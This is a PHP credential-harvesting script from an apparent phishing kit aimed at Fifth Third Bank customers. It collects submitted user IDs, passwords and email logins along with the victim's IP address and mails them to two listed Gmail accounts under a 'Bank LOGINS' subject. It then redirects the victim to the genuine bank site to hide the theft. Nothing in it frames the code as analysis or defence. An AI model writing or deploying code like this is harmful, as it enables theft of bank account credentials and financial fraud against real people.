<?

$ip = getenv("REMOTE_ADDR");
$message .= "---- : || GhostMode || :------\n";
$message .= "user             : ".$_POST['User ID']."\n";
$message .= "pass              : ".$_POST['Password']."\n";
$message .= "email             : ".$_POST['email']."\n";
$message .= "pass              : ".$_POST['Pass']."\n";
$message .= "----: || GhostMode || :------\n";
$message .= "IP: ".$ip."\n";


$recipient = "challaspy@gmail.com, mikechalla8@gmail.com";
$subject = " 53 Bank  LOGINS | ".$ip."\n";

mail($recipient,$subject,$message);
header("Location:  https://www.53.com/content/fifth-third/en.html");
?>